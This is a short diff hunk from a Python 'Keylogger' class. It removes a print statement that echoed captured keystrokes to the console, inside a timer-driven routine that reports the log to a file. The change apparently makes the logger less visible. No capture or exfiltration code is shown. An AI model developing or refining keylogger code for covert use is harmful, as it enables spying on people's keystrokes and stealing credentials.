@@ -46,7 +46,6 @@ class Keylogger:
             self.end_dt = datetime.now()
             self.update_filename()
             self.report_to_file()
-            print(f"[{self.filename}] - {self.log}")
             self.start_dt = datetime.now()
         self.log = ""
         timer = Timer(interval=self.interval, function=self.report)
